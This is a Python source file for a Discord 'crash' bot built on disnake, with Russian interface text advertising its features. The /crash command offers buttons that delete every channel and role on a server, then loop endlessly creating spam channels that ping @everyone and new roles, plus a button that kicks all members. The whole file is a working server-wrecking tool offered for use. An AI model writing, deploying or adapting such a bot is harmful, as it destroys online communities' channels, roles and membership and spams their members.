import disnake
import random
import string
from disnake.ext import commands
from disnake.utils import get
bot = commands.Bot(chunk_guilds_at_startup=False, command_prefix="/", intents=disnake.Intents.all())
bot.remove_command('help')

class CrashButton(disnake.ui.View):
    def __init__(self):
        self = self
        super().__init__(timeout=None)
    @disnake.ui.button(label="начать краш", style=disnake.ButtonStyle.red)
    async def bt1(self,button,inter):
        await inter.response.send_message("краш начался")
    
        for crash in inter.guild.channels:
            try: 
                await crash.delete()
            except:
                pass

        #удаление всех ролей
        for roles in inter.guild.roles:
            try:
                await roles.delete()
            except:
                pass

        #добавление новых каналов
        while True:
            ran = ''.join(random.choices(string.ascii_lowercase, k = 8))
            channelname = ("tesk10q-ch"+ran)
            guild = inter.guild
            overwrites = {
                guild.default_role: disnake.PermissionOverwrite(read_messages=True),
                guild.me: disnake.PermissionOverwrite(read_messages=True)
            }
            await guild.create_text_channel(channelname, overwrites=overwrites)
            channel_id = get(inter.guild.channels, name="tesk10q-ch"+ran)
            channels = channel_id.id
            channel = bot.get_channel(channels)
            embed=disnake.Embed(title="Crash by tesk10q",
            description="Сервер крашиться ботом, создатель бота:\n"
                        "➝ discord: tesk10q\n"
                        "➝ telegram: @realbigdick45",color=0xe9ff26)
            await channel.send("@everyone",embed=embed)

        #добавление новых ролей
            rolename = ("tesk10q-role"+ran)
            await guild.create_role(name=rolename)

    @disnake.ui.button(label="удалить всех участников", style=disnake.ButtonStyle.red)
    async def bt2(self,button,inter):
        #удаление всех участников
        await inter.response.send_message("удаление участников началось")
        for kickall in inter.guild.members:
            try:
                await kickall.kick()
            except:
                pass

@bot.slash_command(
    name="crash",
    description="crash by Tesk"
)   
async def crash(inter):
    embed= disnake.Embed(title="Crash by tesk10q", description="**Наши плюсы:**\n"
                                                                "➝ Быстрый краш сервера\n"
                                                                "➝ Удаление всех комнат\n"
                                                                "➝ Добавление новых комнат\n"
                                                                "➝ Удаление участников(по желанию)\n"
                                                                "➝ Удаление и добавление новых ролей\n"
                                                                "➝ Удобный и простой функционал", color=0xf0a3d0)
    await inter.response.send_message(embed=embed,view=CrashButton())

bot.run("Toкен")
